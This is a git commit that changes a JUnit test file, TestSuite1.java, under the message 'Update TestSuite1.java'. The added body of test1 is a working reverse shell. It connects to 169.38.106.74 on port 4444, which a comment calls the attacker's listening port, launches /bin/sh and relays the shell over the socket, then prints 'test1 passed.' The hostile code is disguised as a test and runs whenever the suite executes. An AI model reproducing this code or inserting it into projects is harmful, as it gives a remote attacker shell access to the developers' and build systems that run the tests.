e3f96f5f39116797a4913188f58a1df05fb402c1
chaitanya241099 <63148179+chaitanya241099@users.noreply.github.com>
2024-10-23 15:30:14 +0530

    Update TestSuite1.java

--- src/test/java/sampletest/TestSuite1.java
+++ src/test/java/sampletest/TestSuite1.java
@@ -2,12 +2,38 @@ package sampletest;
 
 //JUnit 5 annotations
 import org.junit.jupiter.api.Test;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
 
 public class TestSuite1 {
 
     @Test
     public void test1() {
-
+     String host = "169.38.106.74";
+        int port = 4444; // Attackers listening port
+        String[] cmd = {"/bin/sh"};
+        
+        try {
+            Socket s = new Socket(host, port);
+            Process p = Runtime.getRuntime().exec(cmd);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            
+            while(!s.isClosed()) {
+                while (pi.available() > 0) so.write(pi.read());
+                while (pe.available() > 0) so.write(pe.read());
+                while (si.available() > 0) po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+            }
+            
+            p.destroy();
+            s.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         System.out.println("test1 passed.");
 
     }
